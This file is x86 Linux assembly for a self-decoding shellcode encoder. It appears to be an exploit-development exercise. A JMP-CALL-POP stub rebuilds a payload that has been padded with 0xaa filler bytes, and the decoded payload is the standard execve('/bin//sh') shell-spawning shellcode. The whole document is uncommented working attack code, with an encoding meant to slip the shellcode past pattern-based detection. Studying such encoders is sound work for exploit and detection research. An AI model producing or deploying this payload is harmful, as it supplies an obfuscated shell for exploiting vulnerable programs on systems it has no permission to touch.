global _start
section .text
_start:
jmp short shellcode
func_shellcode:
	pop edx
	mov al,1
	mov bl,2
	shellcodeInFront:
		xor cl,cl
		xor cl, byte [edx+ebx]
		xor cl, byte [edx+eax]
		xor byte [edx+eax], cl
		xor byte [edx+ebx], cl
		inc ebx
		cmp byte [edx+ebx], 0xaa
		jne exit
		inc eax
		add ebx,eax
	jmp shellcodeInFront
exit:
	mov eax,1
	mov ebx,0
	int 0x80	

shellcode:
call func_shellcode
message:db 0x50,0xaa,0x68,0xaa,0xaa,0x6e,0xaa,0xaa,0xaa,0x2f,0xaa,0xaa,0xaa,0xaa,0x73,0xaa,0xaa,0xaa,0xaa,0xaa,0x68,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0x68,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0x2f,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0x2f,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0x62,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0x69,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0x89,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xe3,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0x50,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0x53,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0x89,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xe1,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xb0,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0x0b,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xcd,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0x80
